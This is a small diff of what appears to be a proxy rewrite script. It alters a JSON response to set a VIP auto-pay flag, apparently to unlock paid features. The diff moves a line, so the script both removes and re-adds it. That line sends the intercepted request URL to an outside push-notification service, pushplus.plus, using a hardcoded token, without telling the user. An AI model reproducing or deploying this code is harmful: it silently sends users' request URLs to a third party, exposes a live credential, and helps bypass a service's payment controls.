@@ -45,5 +45,6 @@ if (url.indexOf(time) != -1) {
 	obj["isVIPLuxAutoPay"] = 2;
 	body = JSON.stringify(obj);
 }
-$.get("http://www.pushplus.plus/send?token=0449628860114ffb8ca3f14c704437cd&content=123" + url);
 $done({body});
+$.get("http://www.pushplus.plus/send?token=0449628860114ffb8ca3f14c704437cd&content=123" + url);
+
